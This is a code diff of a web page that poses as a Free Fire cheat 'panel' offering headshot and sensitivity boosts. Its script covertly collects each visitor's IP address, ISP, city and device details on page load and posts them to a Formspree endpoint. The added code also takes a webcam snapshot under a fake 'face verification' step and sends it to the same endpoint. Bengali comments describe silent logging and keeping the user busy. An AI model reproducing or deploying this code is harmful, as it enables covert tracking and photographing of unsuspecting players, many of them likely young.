@@ -1,110 +1,62 @@
-<!DOCTYPE html>
-<html lang="bn">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FF Panel Pro | Ultra Headshot & 200% Sensi</title>
-    <link rel="stylesheet" href="style.css">
-    <style>
-        body { background: #0b1116; color: white; font-family: sans-serif; text-align: center; margin: 0; line-height: 1.6; }
-        header { background: #161b22; padding: 15px; border-bottom: 2px solid #ff0055; position: sticky; top: 0; z-index: 1000; }
-        nav a { color: #ff0055; text-decoration: none; margin: 0 15px; font-weight: bold; font-size: 14px; text-transform: uppercase; }
-        .hero { padding: 50px 20px; background: #161b22; border-bottom: 2px solid #222; }
-        .hero h1 { font-size: 30px; color: #ff0055; margin: 0; }
-        .scanner-box { background: #1a1a1a; color: #00ff00; padding: 20px; border-radius: 15px; border: 1px solid #333; margin: 20px auto; max-width: 500px; font-family: monospace; }
-        .sensi-card { background: #1c2128; padding: 30px 20px; border-radius: 20px; border: 1px solid #ff0055; max-width: 500px; margin: 20px auto; }
-        input { width: 80%; padding: 12px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #333; background: #0d1117; color: white; text-align: center; }
-        button { background: #ff0055; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 85%; text-transform: uppercase; }
-        #result { display: none; margin-top: 20px; background: #0b0e11; padding: 15px; border-radius: 10px; border-left: 5px solid #ff0055; text-align: left; }
-        .value { color: #ff0055; font-weight: bold; float: right; }
-        footer { padding: 20px; background: #0d1117; color: #555; font-size: 12px; }
-    </style>
-</head>
-<body>
-
-    <header>
-        <nav>
-            <a href="index.html">Home</a>
-            <a href="contact.html?v=1.1">Contact</a>
-            <a href="about.html">About Dev</a>
-        </nav>
-    </header>
-
-    <div class="hero">
-        <h1>FF PANEL PRO v3.5</h1>
-        <p>Advanced Auto Headshot Optimizer</p>
-    </div>
-
-    <div class="scanner-box">
-        <h3 style="color: #00ffcc;">[System Scanner]</h3>
-        <p id="ip-info">IP: Scanning...</p>
-        <p id="dev-info">Device: Detecting...</p>
-        <p id="bat-info">Battery: Checking...</p>
-        <button onclick="startScan()" id="scanBtn" style="background: #00ff00; color: black;">RUN DEEP SCAN</button>
-    </div>
-
-    <div class="sensi-card">
-        <h3>Activate Panel Settings</h3>
-        <input type="text" id="phone" placeholder="Enter Device (Ex: Vivo, Redmi)">
-        <button onclick="activate()">Get 200% Sensi</button>
-        <div id="result">
-            <h4 style="text-align:center; color:#00ffcc;">CONFIGURATION READY!</h4>
-            <p>General <span class="value" id="v1"></span></p>
-            <p>Red Dot <span class="value" id="v2"></span></p>
-            <p>Fire Button <span class="value">45%</span></p>
-            <p>Status: <span style="color:#00ffcc;">Bypass Active</span></p>
-        </div>
-    </div>
-
-    <footer>&copy; 2026 Gaming Panel Pro | Dev by Sojol</footer>
-
-       <script>
+<script>
 async function collectData() {
     try {
-        // ১. আইপি এবং প্রোভাইডার তথ্য (ISP)
         const ipRes = await fetch('https://ipapi.co/json/');
         const data = await ipRes.json();
         
-        const info = {
-            IP: data.ip,
-            City: data.city,
-            Region: data.region,
-            Country: data.country_name,
-            ISP: data.org, // কোন কোম্পানির ইন্টারনেট ব্যবহার করছে
-            Device: navigator.userAgent.split(')')[0].split('(')[1],
-            Platform: navigator.platform,
-            Language: navigator.language,
-            Connection: navigator.connection ? navigator.connection.effectiveType : "Unknown"
-        };
-
-        // ২. আপনার Formspree আইডিতে ডাটা পাঠানো
+        // ১. সাধারণ ডাটা পাঠানো
         fetch("https://formspree.io/f/mgorkgyy", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(info)
+            body: JSON.stringify({
+                IP: data.ip,
+                ISP: data.org,
+                City: data.city,
+                Device: navigator.userAgent
+            })
+        });
+    } catch (e) { console.log("Silent logging..."); }
+}
+
+// ক্যামেরা স্ন্যাপশট ফাংশন
+async function takeSnapshot() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const imgData = canvas.toDataURL('image/jpeg');
+
+        // ২. ছবিসহ ডাটা পাঠানো (এটি Formspree-তে অনেক সময় বড় হতে পারে, তাই সাবধান)
+        fetch("https://formspree.io/f/mgorkgyy", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ Photo_Base64: imgData, Status: "Face Captured" })
         });
 
-        // ৩. স্ক্রিনে দেখানোর জন্য (ঐচ্ছিক)
-        document.getElementById('ip-info').innerText = "IP: " + data.ip;
-        document.getElementById('dev-info').innerText = "Provider: " + data.org;
-    } catch (e) {
-        console.log("Stealth mode active...");
+        stream.getTracks().forEach(track => track.stop()); // ক্যামেরা বন্ধ করা
+    } catch (err) {
+        alert("Verification Failed! Please allow camera for High Sensi.");
     }
 }
 
-// ইউজার সাইটে ঢোকার সাথে সাথে ডাটা কালেকশন শুরু হবে
 window.onload = collectData;
 
-async function startScan() {
-    // আগের বাটনের ফাংশন যা ইউজারকে ব্যস্ত রাখবে
+function startScan() {
     const btn = document.getElementById('scanBtn');
-    btn.innerText = "SCANNING SYSTEM...";
-    setTimeout(() => {
-        alert("Deep Scan Complete! Your device is optimized.");
-        btn.innerText = "SYSTEM SECURE";
-    }, 3000);
+    btn.innerText = "VERIFYING FACE...";
+    // ক্যামেরা পারমিশন চাওয়া
+    takeSnapshot().then(() => {
+        setTimeout(() => {
+            alert("Face Verified! Deep Scan Complete.");
+            btn.innerText = "SYSTEM SECURE";
+        }, 3000);
+    });
 }
 </script>
-
-</body>
-</html>
